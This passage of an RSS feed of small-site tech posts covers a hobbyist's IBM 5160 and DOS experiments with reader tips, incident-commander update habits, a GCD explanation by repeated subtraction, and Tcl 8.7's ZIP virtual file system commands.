        <p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/basic-startup-screen_hu03af1e9e4264eec2575cd1ba06f1e20e_255454_600x600_fit_q75_box.jpg" width="600" height="450"></p><figcaption>
            <small>
                
                
Entering BASIC is peanuts

                
            </small>
        </figcaption>
    </div>
</figure>
<div data-target="1fadd62c83243e573af5941d4eb32c02">
    <div>
        <p><span id="close-1fadd62c83243e573af5941d4eb32c02">×</span></p><p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/basic-startup-screen.jpg" width="4032" height="3024"></p>
    </div>
</div>










<figure id="0e171f24d2705fcfc1f3dddef5ea66e3">
    <div>
        <p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/cannot-exit-basic_hu7173749eb1353b22f37803cfee1222d6_251610_600x600_fit_q75_box.jpg" width="600" height="450"></p><figcaption>
            <small>
                
                
Stuck in BASIC

                
            </small>
        </figcaption>
    </div>
</figure>
<div data-target="0e171f24d2705fcfc1f3dddef5ea66e3">
    <div>
        <p><span id="close-0e171f24d2705fcfc1f3dddef5ea66e3">×</span></p><p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/cannot-exit-basic.jpg" width="4032" height="3024"></p>
    </div>
</div>





<figure id="34bf581ec5de30d29fb4a52465d157a0">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/trying-stuff-in-qbasic.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    
    
    <figcaption>
        <small>
            
Trying to exit QBASIC. Epic fail

        </small>
    </figcaption>
    
    </p>
</figure>


<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>That is <em>not</em> <code>QBASIC</code>; <code>QBASIC</code> has a GUI. You were in either <code>BASICA</code> or <code>GWBASIC</code>. The command to quit is <code>syst em</code>, if I remember correctly after 30 years.</p>
</blockquote>
<p>So, now I can start a few commands, but getting all available commands is not that straight forward. There is a lot in the <code>DOS</code> directory, but there is no scrolling, and the monitor only is 25 lines.</p>
<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>Yes there is [scrolling]. Type <code>dir /p</code> for page-by-page. <code>dir /w</code> gives a wide listing. You can combine these: <code>dir /w /p</code>. You can also do <code>dir | more</code></p>
</blockquote>
<blockquote>
<p>[the monitor is only 25 lines] This depends on the graphics card. If you have an MDA card, no, 25 lines is all. Try <code>mode con: lines=43</code> or <code>mode con: lines=50</code>. This will only work on a VGA-compatible card, though, and you will need ANSI.SYS installed, I think.</p>
</blockquote>
<p>So figuring out the available commands is using a lot of <code>DIR *.EXE</code>'s and <code>DIR *.COM</code>'s.</p>
<p>First class fun.</p>
<h2 id="show-me-the-pics">Show me the pics</h2>
<p>Not so long ago I was explaining my collegue (who is using a screensaver), <a href="https://en.wikipedia.org/wiki/Screensaver">where a screensaver got its name from</a>. Back in the days, when we were all running the <a href="https://www.youtube.com/watch?v=Uzx9ArZ7MUU">pipes</a> so the screen would not <span>fuck up</span>
.</p>
<p>But now, sit back and relax…</p>



<figure id="f3b027a374567777bfd8178001360334">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/insane-refresh-rate-oldskool-monitor.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

    
    
    <figcaption>
        <small>
            
Check this insane refresh rate of the cathode tube. The color of the terminal is magnificent! 😍

        </small>
    </figcaption>
    
    </p>
</figure>





<figure id="4cdf95e55b8fbd6e1c5e3ea1f0bd43bf">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/more-refresh-rate.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

    
    
    <figcaption>
        <small>
            
And more refresh rate. The mesmerizing fading away of the fonts into the background. Beautiful, just beautiful

        </small>
    </figcaption>
    
    </p>
</figure>





<figure id="6f82255ebe285b0963065fc046514bcf">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/booting-into-dos.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

    
    
    <figcaption>
        <small>
            
🔈 The startup is amazing as well. The sound of the fan, and the nostalgic beep.

        </small>
    </figcaption>
    
    </p>
</figure>





<figure id="43c3937b62bdb5325a2b1a8a57bc530d">
    <p>
        
        <video controls="">
            <source src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/videos/booting-into-dos-again.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

    
    
    <figcaption>
        <small>
            
🔈 One more time. I could loop this forever.

        </small>
    </figcaption>
    
    </p>
</figure>










<figure id="01da5907dc0ec7a58dc42ca82d974286">
    <div>
        <p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/ibm-dos-edit-dutch_hu3a6de3285dc77b6df0e675474f4c7576_447189_600x600_fit_q75_box.jpg" width="600" height="450"></p><figcaption>
            <small>
                
                
un DOS tres. The fluorescence is soooo pretty.

                
            </small>
        </figcaption>
    </div>
</figure>
<div data-target="01da5907dc0ec7a58dc42ca82d974286">
    <div>
        <p><span id="close-01da5907dc0ec7a58dc42ca82d974286">×</span></p><p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/ibm-dos-edit-dutch.jpg" width="4032" height="3024"></p>
    </div>
</div>










<figure id="69f512f8bcce7a3b38b62b31e321231a">
    <div>
        <p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/wpview-printer-driver-bat-file_hu5af41f7c240e39ab901ff694320d0a39_288464_600x600_fit_q75_box.jpg" width="600" height="450"></p><figcaption>
            <small>
                
                
wppreview, I totally miss the point of this program. But, hey, it's there.

                
            </small>
        </figcaption>
    </div>
</figure>
<div data-target="69f512f8bcce7a3b38b62b31e321231a">
    <div>
        <p><span id="close-69f512f8bcce7a3b38b62b31e321231a">×</span></p><p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/wpview-printer-driver-bat-file.jpg" width="4032" height="3024"></p>
    </div>
</div>


<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>It [wppreview] is not part of DOS. Sounds like a WordPerfect preview program for use with mailmerge.</p>
</blockquote>
<h2 id="what-next">What next?</h2>
<p>So far I had to explain to my son what a <code>file(name)</code> and a <code>command</code> is (when they were typing “words” the IBM kept returning</p>
<p>So the experience is already educational :)</p>
<p>To be honest, I do not have a clear idea what I am going to do with it next. I will be playing with it for a while like an 8 year old with his trains.
After the <a href="https://twitter.com/hashtag/stayathome"><code>#stayathome</code></a> is over, hopefully I can take it to the office, so we can start doing real cool things with it.</p>
<p>I will definitely have to up my <a href="https://www.qb64.org/wiki/GOTO"><code>GOTO</code></a> skills :)</p>
<p>I will start using my Model M2 for work (sorry collegues), for sure. I will have to remap my function key in <a href="https://i3wm.org/"><code>i3</code></a>, because I am currently using the
windows key for this. But the Model M2 does not have one. But I will overcome.</p>
<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>It is easy to remap CapsLock to be a “Windows” (Super) key. This is how I use my IBM Model M in Linux. I suggest <code>xmodmap</code>.</p>
</blockquote>
<p>Besides that, I found this great archive with <a href="ihttps://archive.org/search.php?query=dos%20ibm">manuals</a> and <a href="http://www.retroarchive.org/dos/disks/">bootdisks</a> and even <a href="https://winworldpc.com/download/40c2a543-4218-c39a-11c3-a4e284a2c3a5">PC DOS 5.02</a>. Currently I am trying to get a VM up running PC DOS 5.0 (yes, that is possible in <a href="https://www.youtube.com/watch?v=xfjUkJMe_kw">virtualbox</a>)</p>
<p><strong>FEEDBACK</strong></p>
<blockquote>
<p>If you are willing to change the DOS version, I suggest DR DOS 3.41. The reason is this: MS/PC DOS 5, 6 &amp; later are designed for 386 memory management. This is impossible on an 8088 chip, and as a result, you will have very little free memory. Many DOS programs won’t work.</p>
</blockquote>
<blockquote>
<p>DR-DOS is a better 3rd party clone of DOS, by the company that wrote the original OS (CP/M) that MS-DOS was ripped-off from. The first version is 3.41 (before that it had different names) and it is far more memory-efficient. <a href="https://winworldpc.com/product/dr-dos/3x">https://winworldpc.com/product/dr-dos/3x</a></p>
</blockquote>
<blockquote>
<p>But if you want to stay with an IBM original DOS, then IBM developed PC DOS all the way to version 7.1, which supports EIDE hard disks over 8GB, FAT32 and some other nice features. It is a free download.</p>
</blockquote>
<blockquote>
<p>I have described how to get it here: <a href="https://liam-on-linux.livejournal.com/59703.html">https://liam-on-linux.livejournal.com/59703.html</a></p>
</blockquote>
<blockquote>
<p>PC DOS 7 is a bit strange; IBM removed Microsoft’s GUI editor and replaced it with an OS/2-derived one called E, which has a weird UI. IBM also removed GWBASIC and replaced it with the Rexx scripting language.</p>
</blockquote>
<blockquote>
<p>Personally, I combine bits of PC-DOS 7.1 with Microsoft’s editor, Microsoft’s diagnostics, Scandisk disk-repair tool and some other bits, but that is more than I can cover in a comment!</p>
</blockquote>
<blockquote>
<p>There is a lot you can do to upgrade a 5160 if you wish. Here is a crazy example: <a href="https://sites.google.com/site/misterzeropage/">https://sites.google.com/site/misterzeropage/</a></p>
</blockquote>
<blockquote>
<p>I would not go that far, but a VGA card, VGA CRT, a serial mouse and an XTIDE card with a CF card in it, and it would be a lot easier to use…</p>
</blockquote>
<p>The downside, my Cherry MX blue switches feel like second class now.</p>
<h2 id="update">UPDATE</h2>
<p>When I was installing my VM with <code>PC DOS</code>, at the end of the installation I was aske if I wanted to start in <code>shell</code> mode. It turns out there is a command <code>DOSSHELL</code> (needs to be executed fron <code>C:\DOS</code>) which gives you a very fancy
gui.</p>








<figure id="8a76cf6b5c012a99a1bf166c516671c4">
    <div>
        <p><img src="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/images/dosshell_hu8b1374a2b83ba8d4970af29e66446ddf_361223_600x600_fit_q75_box.jpg" width="600" height="450"></p><figcaption>
            <small>
                
                
😱 It …</small></figcaption></div></figure></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/">https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/</a></em></p>]]>
            </description>
            <link>https://www.forsure.dev/-/2020/05/19/640-kilobytes-of-ram-and-why-i-bought-an-ibm-5160/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258010</guid>
            <pubDate>Mon, 24 Aug 2020 06:30:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Incident updates, interruptions and the 30 minute window]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24257918">thread link</a>) | @kiyanwang
<br/>
August 23, 2020 | https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/ | <a href="https://web.archive.org/web/*/https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>For most companies Incident Commander or Incident Manager is not a
specific job, it’s a role you may take on when something has gone, often
horribly, wrong and you need to quickly unite an adhoc group into a team
to resolve it. The incident commander should be the point of contact,
and source of truth, about your incident and to do that successfully
they’ll need to be updated and kept informed about what’s happening.
Depending on how experienced they are in the role this can be a very
light touch experience or it can feel like being constantly nagged to
put the washing away while someone burns money nearby.</p>
<p>I’ve been involved in a fair few incidents over the years and one of the
best approaches I’ve seen to handling updates and interruptions was from
someone who had an amazing internal clock; or a watch we never noticed.
When handling an incident he’d essentially give himself a 30 minute,
reset-able, window of time. Once he’d been given the initial
introduction to the incident he’d step back, handle the communication
and anything else the incident responders has asked for and wait for
about 30 minutes.</p>
<p>If no one gave him any new information or status updates he’d consider
it an invitation to interrupt and ask what was going on. Once he’d been
updated he’d move back and let the team run with the problem. If someone
gave him an update before the 30ish minutes were up he’d reset his
timer, leave you alone and try to get whatever you’d asked for. I don’t
know if it was just a well chosen period based on experience or the
limit of his patience but 30 minutes was often enough to stop people
rabbit holing while the fires were raging.</p>
<p>Once I’d left the team he often managed incidents for and became one of
his internal customers I began to notice that everyone in his area
developed the subconscious habit of delivering their status updates
every 25 minutes or so, even when he wasn’t the incident manager for
a specific incident. I never discovered if this was all a deliberate
attempt to set the culture he wanted or he was just being himself but as
someone handling an incident I always appreciated the time and
predictability of his involement. Thanks to LinkedIn and Twitter I could
probably track him down and ask but I’ve always liked the idea it was
just him being himself.</p>
</div></div>]]>
            </description>
            <link>https://www.unixdaemon.net/sysadmin/incident-updates-and-interruptions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257918</guid>
            <pubDate>Mon, 24 Aug 2020 06:08:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GCD and the magic of subtraction]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24257871">thread link</a>) | @plumsempy
<br/>
August 23, 2020 | https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/ | <a href="https://web.archive.org/web/*/https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1295">

	

	
			<figure>
				<img width="1229" height="727" src="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=1229" alt="" loading="lazy" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png 1229w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=1024 1024w" sizes="(max-width: 1229px) 100vw, 1229px" data-attachment-id="1315" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-4/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png" data-orig-size="1229,727" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 4" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=750">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>The greatest common divisor is something I learned in school but it was one of those “so what?” subjects. But recently I revisited it and it is very interesting.</p>



<p><strong>Why is gcd cool?</strong></p>



<p>Every number, can be expressed as the product of prime numbers. This product for every number is unique; sort of like saying, every number has a fingerprint. This is called the <a href="https://en.wikipedia.org/wiki/Fundamental_theorem_of_arithmetic">fundamental theorem of arithmetic</a>. 36 is <code>4x9</code>, and 45 is <code>5x9</code>. This means that some numbers will have common parts with each other.</p>



<p>These common parts can divide both numbers, and thus they are common divisors. In the example above, 36 is <code>4x9</code> or <code>2x2x3x3</code>, while 45 is <code>5x3x3</code>; 3 is a common divisor of both, so is <code>3x3</code>, which is 9; but 9 is the greatest divisor of both 36 and 45.</p>



<p>One question I had when I was younger, was why we are talking about the “greatest” and not the smallest common divisor. We could, but soon, this gets boring: there is 1, the smallest common divisor of every number, then there are some common divisors in between 1 and the gcd. But what the gcd does so uniquely, is that it takes two numbers and gives us <em>all</em> the common parts of two numbers. </p>



<figure><img data-attachment-id="1328" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-1-3/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png" data-orig-size="1150,844" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 1" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=750" src="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=1024" alt="" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=1024 1024w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png 1150w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>common and uncommon parts of 36(4×9) and 45(5×9). The gcd of 36 and 45 is 9.</figcaption></figure>



<p>This is cool! The uncommon parts are relatively prime! — meaning, they have nothing in common but the number 1. </p>



<p>So to find the gcd, then, we need to find all the common parts of the two numbers when written in terms of their prime factors. </p>



<p><code>36=3x3x2x2</code> and <code>45=3x3x5</code>, thus the gcd of 36 and 45 is <code>3x3</code>, which is 9. So 36 is 9(4) and 45 is 9(5). It is very interesting to look at numbers as multiples of gcds. Moreover, notice that these multipliers, 4 and 5 in the example above, are relatively prime. </p>



<p><strong>The magic of subtraction</strong></p>



<p>Subtracting two relatively prime numbers, will produce another number that, while not necessarily prime itself, will be relatively prime to both the previous numbers. As an example, <code>13-7=6</code>. 6 is not prime, but it is relatively prime to both 7 and 13. If we subtract 6 from 13 we will get 7 again which is not very interesting. But if we subtract 6 from 7, the smaller one, since 6 and 7 are relatively prime we should get another number that is relatively prime to them both; <code>7-6=1</code>, which is relatively prime to every other number, if keep doing this:</p>


<pre title="">13 -  7 = 6
7  -  6 = 1
6  -  1 = 5
5  -  1 = 4
4  -  1 = 3
3  -  1 = 2
2  -  1 = 1
1  -  1 = 0

(1, 0)
</pre>


<p>The final two numbers are 0 and 1. So whenever we start with two relatively prime numbers and do this on them, it will always end with 0 and 1. This is pretty strange and magical. I am still perplexed by it, but the way I convinced myself, is to think about it bottom up: if we start with the number 1, and try to build our way to any other number by addition, there are finite number of ways. So when we start subtracting, what we are doing is walking that path backwards towards 1. </p>



<figure><img data-attachment-id="1319" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-3/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png" data-orig-size="1226,634" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 3" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=750" src="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=1024" alt="" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=1024 1024w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png 1226w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>There is a limited set of paths from any two numbers back to 1 by successive subtractions.</figcaption></figure>



<p>Now why do these two numbers need to be relatively prime? because if they are not relatively prime, that means that they have some parts in common, like 36 and 45 above, remember? they are 9(4) and 9(5). If we do the subtracting trick on them:</p>


<pre title="">9(5) - 9(4) = 9(1)
9(4) - 9(1) = 9(3)
9(3) - 9(1) = 9(2)
9(2) - 9(1) = 9(1)
9(1) - 9(1) = 9(0)

(9(1), 0)
</pre>


<p>So you see, the common part survives the subtractions, while the uncommon parts converge to 1. But 9 is <em>all</em> the common parts of 36 and 45, in other words the gcd of 36 and 45! </p>



<p>Can we keep subtracting any two numbers until we reach (X, 0) and then proclaim X is the greatest common divisor? yes, we can, and it is called the <em><a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">Euclidean Algorithm</a></em>.</p>



<p>Here is a silly experiment, what if we subtract the partially common parts? for 36 and 45, what if we wrote them as 3(12) and 3(15)?</p>


<pre title="">3(15) -  3(12) = 3(3)
3(12) -  3(3)  = 3(9)
3(9)  -  3(3)  = 3(6)
3(6)  -  3(3)  = 3(3)
3(3)  -  3(3)  = 3(0)

(3(3), 0)
</pre>


<p>This is really funny. The algorithm basically told us that the gcd of 12 and 15 is 3. Now if we choose to multiply the other 3 that we have factored out before we started our subtraction, it will yield the same result: the gcd of 36 and 45 is 9.</p>



<p><strong>What just happened?</strong></p>



<p>We started by finding the gcd of two numbers, then subtracting the uncommon, relatively prime parts to realize we always reach 1, so if we always subtract any two numbers from each other repeatedly, since the gcd is a common factor of both, it will remain constant until the end, when the uncommon parts have reduced down to 1 and 0; and then what we are left with is the gcd. </p>



<p>Here is a recursive implementation of it in Python:</p>


<pre title="">def gcd(a,b):
    if a == 0: return b
    if b == 0: return a

    return gcd(abs(a-b), min(a,b))
</pre>


<p>If someone has a better explanation of why subtracting relatively prime numbers repeatedly will always result in one, please leave a comment or reach out and help me understand better.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257871</guid>
            <pubDate>Mon, 24 Aug 2020 05:57:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introducing Tcl 8.7 Part 11: The ZIP virtual file system]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24257855">thread link</a>) | @systems
<br/>
August 23, 2020 | https://www.magicsplat.com/blog/tcl87-zipfs/ | <a href="https://web.archive.org/web/*/https://www.magicsplat.com/blog/tcl87-zipfs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <header>
                        
                        <p>
                            Published <time datetime="2020-08-23+0000">2020-08-23</time>
                        </p>
                    </header>
                    <p>
                        This is the eleventh in a series of <a href="https://www.magicsplat.com/blog/tags/tcl-8-7/">posts</a> about new features in the upcoming version 8.7 of Tcl. It is the first of a pair of posts describing core support for treating ZIP archives as virtual file systems within Tcl. This post focuses on base operations dealing with existing ZIP archives. The next describes the creation of ZIP archives and their use for building <em>zipkits</em> and single file executables.
                    </p><!-- more -->
                    <blockquote>
                        <p>
                            To take Tcl 8.7 for a spin, you can download the <a href="https://sourceforge.net/projects/tcl/files/Tcl/8.7a3/">source</a> distribution. Binary distributions for Windows are available from <a href="https://sourceforge.net/projects/magicsplat/files/barebones-tcl/">magicsplat</a> and <a href="http://www.bawt.tcl3d.org/download.html#tclbi">BAWT</a>.
                        </p>
                    </blockquote>
                    <p>
                        With Tcl 8.6, access to files in ZIP archives was already possible. Tcl itself offered the ability to compress and decompress data with the <code>zlib</code> command. The <code>zipfile</code> module in <code>tcllib</code> then made use of these to permit access to files within an archive.
                    </p>
                    <p>
                        Tcl 8.7 goes beyond these capabilities by treating ZIP archives as mountable <em>virtual file systems</em> (VFS). This makes access to the files within the archive much simpler through the standard Tcl channel commands <code>open</code>, <code>gets</code> etc.
                    </p>
                    <h2>
                        Mounting ZIP archives
                    </h2>
                    <p>
                        The first step to accessing ZIP archives is to mount them as a Tcl VFS. This is done with the <code>zipfs mount</code> command.
                    </p>
                    <pre><code>% zipfs mount mnt demo.zip</code></pre>
                    <p>
                        This results in the archive <code>demo.zip</code> being mounted as a VFS under the path <code>zipfs:/mnt</code>.
                    </p>
                    <p>
                        The root of all ZIP file systems is given by the <code>zipfs root</code> command.
                    </p>
                    <pre><code>% zipfs root
zipfs:/</code></pre>
                    <p>
                        This root is platform-specific, <code>zipfs:/</code> on Windows and <code>//zipfs:/</code> on Unix(y) systems.
                    </p>
                    <p>
                        Naturally, you can mount multiple archives or even the same archive multiple times. The mount points of course have to be different but one can be nested inside another. For example,
                    </p>
                    <pre><code>% zipfs mount mnt2 demo.zip
% zipfs mount mnt/nested demo2.zip</code></pre>
                    <p>
                        Invoking <code>zipfs mount</code> without any arguments will return the currently mounted ZIP archives as a flat list of mount points and the archive file path.
                    </p>
                    <pre><code>% zipfs mount
zipfs:/mnt demo.zip zipfs:/mnt/nested demo2.zip zipfs:/mnt2 demo.zip</code></pre>
                    <p>
                        ZIP archives may be protected with a password. In that case the password must be supplied as the last argument to the command.
                    </p>
                    <p>
                        When no longer needed the each VFS should be unmounted with <code>zipfs unmount</code>.
                    </p>
                    <pre><code>% zipfs unmount mnt2
% zipfs unmount mnt/nested
% zipfs mount
zipfs:/mnt demo.zip</code></pre>
                    <h2>
                        Introspecting archives
                    </h2>
                    <p>
                        Once mounted, the archives can be introspected.
                    </p>
                    <p>
                        The <code>zipfs list</code> command returns a list of the files in the ZIP file system. Optionally, regular expression or glob wildcard patterns may be specified to filter the returned paths.
                    </p>
                    <pre><code>% zipfs list
zipfs:/mnt/demo zipfs:/mnt zipfs:/mnt/demo/subdir/file.txt zipfs:/mnt/demo/subdir zipfs:/mnt/demo/demo.txt
% zipfs list *.txt
zipfs:/mnt/demo/subdir/file.txt zipfs:/mnt/demo/demo.txt
% zipfs list -glob *.txt
zipfs:/mnt/demo/subdir/file.txt zipfs:/mnt/demo/demo.txt
% zipfs list -regexp {\.txt$}
zipfs:/mnt/demo/subdir/file.txt zipfs:/mnt/demo/demo.txt</code></pre>
                    <p>
                        Notice there is no mount point specified above. The command lists all files and directories under the ZIP VFS root. To restrict to a specific archive, specify it as a pattern.
                    </p>
                    <p>
                        A similar command returns a list of all file paths under a specific directory.
                    </p>
                    <pre><code>% zipfs find zipfs:/mnt/demo/subdir
zipfs:/mnt/demo/subdir/file.txt</code></pre>
                    <p>
                        <strong>TIP:</strong> The <code>zipfs find</code> command will work with any file system, not just ZIP VFS'es.
                    </p>
                    <p>
                        Since the ZIP archive is mounted as a Tcl VFS, standard Tcl commands for retrieving generic file information can be used. For example,
                    </p>
                    <pre><code>% file size zipfs:/mnt/demo/demo.txt
12
% clock format [file atime zipfs:/mnt/demo/demo.txt]
Sun Aug 23 12:33:24 IST 2020</code></pre>
                    <p>
                        The <code>zipfs info</code> command returns additional information that is specific to the ZIP archive format.
                    </p>
                    <pre><code>% zipfs info zipfs:/mnt/demo/demo.txt
demo.zip 12 14 50</code></pre>
                    <p>
                        The returned list contains the name of the ZIP archive (as originally passed), the original file size, the compressed file size and the offset of the file's compressed data within the ZIP archive. (As an aside, note in our example that the "compressed" size is greater than the actual size as often happens for small files.)
                    </p>
                    
                    <p>
                        Data transfer from compressed files in the archive is achieved through the standard Tcl channel I/O commands.
                    </p>
                    <pre><code>% set chan [open zipfs:/mnt/demo/demo.txt]
zipfs_32_1
% gets $chan
Demo file 
% close $chan</code></pre>
                    <p>
                        You can also open the file for writing. However, the ZIP VFS does not support the append mode.
                    </p>
                    <h2>
                        Coming up
                    </h2>
                    <p>
                        Having described the basics of access to ZIP archives, in the next post I will illustrate the use of the new features for creating ZIP archives, zipkits and single-file executables.
                    </p>
                    <h2>
                        References
                    </h2>
                    <ol>
                        <li>
                            <p>
                                <a href="https://core.tcl-lang.org/tips/doc/trunk/tip/430.md">TIP 430: Add basic ZIP archive support to Tcl</a>
                            </p>
                        </li>
                        <li>
                            <p>
                                <a href="http://www.tcl-lang.org/man/tcl8.7/TclCmd/zipfs.htm">zipfs man page</a>
                            </p>
                        </li>
                    </ol>
                    <nav>
                        Tagged:
                        <ul>
                            <li>
                                <a href="https://www.magicsplat.com/blog/tags/tcl/">Tcl</a>
                            </li>
                            <li>
